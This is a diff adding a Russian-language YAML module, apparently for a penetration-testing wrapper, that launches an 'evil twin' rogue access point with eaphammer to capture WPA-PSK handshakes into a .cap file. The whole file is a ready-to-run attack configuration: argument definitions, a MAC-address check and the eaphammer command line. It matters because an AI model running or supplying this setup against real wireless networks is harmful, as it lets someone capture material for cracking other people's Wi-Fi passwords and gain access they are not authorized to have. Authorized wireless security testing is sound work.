@@ -1,0 +1,44 @@
+description: Перехватывает хендшейки с помощью поддельной точки доступа
+tags:
+  - wpa-psk
+  - evil twin
+  - handshake
+
+arguments:
+  b:
+    description: BSSID создаваемой точки доступа
+    default:
+      -
+    regex: '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
+    replacer: '#bssid#'
+  c:
+    description: канал создаваемой точки доступа
+    default:
+      -
+    regex: '[0-9]+'
+    replacer: '#channel#'
+  o:
+    description: выходной .cap файл с хендшейками
+    default: '[ESSID]'
+    replacer: '#output#'
+  interface:
+    description: имя интерфейса wlan
+  essid:
+    description: имя поддельной точки доступа
+
+mode:
+  format:
+    interface: '--interface {!r}'
+    essid: '--essid {!r}'
+    o: '{!r}'
+    b: ' --bssid {!r}'
+    c: ' --channel {!r}'
+  replace:
+    o:
+      '[ESSID]': './#essid#.cap'
+
+shell: bash
+
+script: >-
+  sudo eaphammer #interface# #essid# --auth wpa-psk --password 00000000 --psk-capture-file "$(realpath #output#)"#bssid##channel#
+  
